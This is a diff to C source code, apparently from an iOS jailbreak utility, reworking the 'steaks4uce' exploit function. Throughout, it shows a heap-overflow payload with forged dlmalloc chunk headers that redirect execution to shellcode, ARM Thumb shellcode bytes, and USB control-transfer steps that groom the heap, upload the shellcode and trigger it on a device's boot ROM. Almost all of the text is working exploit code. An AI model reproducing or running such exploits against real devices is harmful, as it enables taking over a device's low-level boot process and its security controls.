@@ -313,7 +313,6 @@ int upload_firmware_payload(char* type) {
 int steaks4uce_exploit() {
 	int i, ret;
 	unsigned char data[0x800];
-	unsigned char status[6];
 	unsigned char payload[] = {
 				/* free'd buffer dlmalloc header: */
 				0x84, 0x00, 0x00, 0x00, // 0x00: previous_chunk
@@ -330,70 +329,60 @@ int steaks4uce_exploit() {
 				/* attack dlmalloc header: */
 				0x15, 0x00, 0x00, 0x00, // 0x28: previous_chunk
 				0x02, 0x00, 0x00, 0x00, // 0x2c: next_chunk : 0x2 choosed randomly :-)
-				0x01, 0x30, 0x02, 0x22, // 0x30: FD : shellcode_thumb_start()
+				0x01, 0x38, 0x02, 0x22, // 0x30: FD : shellcode_thumb_start()
 				//0x90, 0xd7, 0x02, 0x22, // 0x34: BK : free() LR in stack
 				0xfc, 0xd7, 0x02, 0x22, // 0x34: BK : exception_irq() LR in stack
 				};
-	// attack explanation :
-	// when free() is called, the chunk unlink code will do:
-	//
-	//    FD[0xc] = BK
-	//    BK[0x0] = FD
-	//
 
-	unsigned char shellcode_thumb_start[] = {
-				0x06, 0xe0,		// B shellcode_thumb
-				0x00, 0x00,		// NOP
-				0x00, 0x00,		// NOP
-				0x00, 0x00,		// NOP
-				0x00, 0x00,		// NOP
-				0x00, 0x00,		// NOP
-				0x00, 0x00, 0x00, 0x00,	// this will be overwritten by BK
-				};
+	info("Executing steaks4uce exploit ...\n");
+	debug("Reseting usb counters.\n");
+	ret = irecv_control_transfer(client, 0x21, 4, 0, 0, 0, 0, 1000);
+	if (ret < 0) {
+		error("Failed to reset usb counters.\n");
+		return -1;
+	}
 
-	unsigned char shellcode_thumb[] = {
-				0x00, 0x20,		// MOVS	R0, #0
-				0x03, 0x49,		// LDR	R1, =0x22023000
-				0x00, 0x22,		// MOVS	R2, #0xDEAD
-				0x03, 0x4B,		// LDR	R3, =0x3339
-				0x98, 0x47,		// BLX	R3			; calls sub_3338 (jump_to)
-				0x90, 0xbd,		// POP  {R4,R7,PC}
-				0x00, 0x00,		// NOP
-				0x00, 0x00,		// NOP
-				0x00, 0x00, 0x00, 0x00,
-				0x39, 0x33, 0x00, 0x00,
-				};
+	debug("Padding to 0x23800...\n");
+	memset(data, 0, 0x800);
+	for(i = 0; i < 0x23800 ; i+=0x800)  {
+		ret = irecv_control_transfer(client, 0x21, 1, 0, 0, data, 0x800, 1000);
+		if (ret < 0) {
+			error("Failed to push data to the device.\n");
+			return -1;
+		}
+	}
+	debug("Uploading shellcode.\n");
+	memset(data, 0, 0x800);
+	memcpy(data, steaks4uce, sizeof(steaks4uce));
+	ret = irecv_control_transfer(client, 0x21, 1, 0, 0, data, 0x800, 1000);
+	if (ret < 0) {
+		error("Failed to upload shellcode.\n");
+		return -1;
+	}
+
+	debug("Reseting usb counters.\n");
+	ret = irecv_control_transfer(client, 0x21, 4, 0, 0, 0, 0, 1000);
+	if (ret < 0) {
+		error("Failed to reset usb counters.\n");
+		return -1;
+	}
 
 	int send_size = 0x100 + sizeof(payload);
-
-	payload[0x14] = send_size & 0xff;
-	payload[0x15] = (send_size >> 8) & 0xff;
-	payload[0x16] = (send_size >> 16) & 0xff;
-	payload[0x17] = (send_size >> 24) & 0xff;
-
+	*((unsigned int*) &payload[0x14]) = send_size;
 	memset(data, 0, 0x800);
-	memcpy(data, shellcode_thumb_start, sizeof(shellcode_thumb_start));
-	memcpy(&data[sizeof(shellcode_thumb_start)], shellcode_thumb, sizeof(shellcode_thumb));
 	memcpy(&data[0x100], payload, sizeof(payload));
-
-	for(i = 0; i < 46; i++) irecv_control_transfer(client, 0x21, 1, 0, 0, data, send_size, 1000);
-
-	debug("Sending exploit payload\n");
-	irecv_hexdump(data, send_size, 0);
 
 	ret = irecv_control_transfer(client, 0x21, 1, 0, 0, data, send_size , 1000);
 	if (ret < 0) {
-		error("Unable to send payload exploit\n");
+		error("Failed to send steaks4uce to the device.\n");
 		return -1;
 	}
-
-	debug("Executing exploit payload\n");
 	ret = irecv_control_transfer(client, 0xA1, 1, 0, 0, data, send_size , 1000);
 	if (ret < 0) {
-		error("Unable to execute exploit payload\n");
+		error("Failed to execute steaks4uce.\n");
 		return -1;
 	}
-	debug("Payload sent & executed successfully.\n");
+	info("steaks4uce sent & executed successfully.\n");
 
 	return 0;
 }
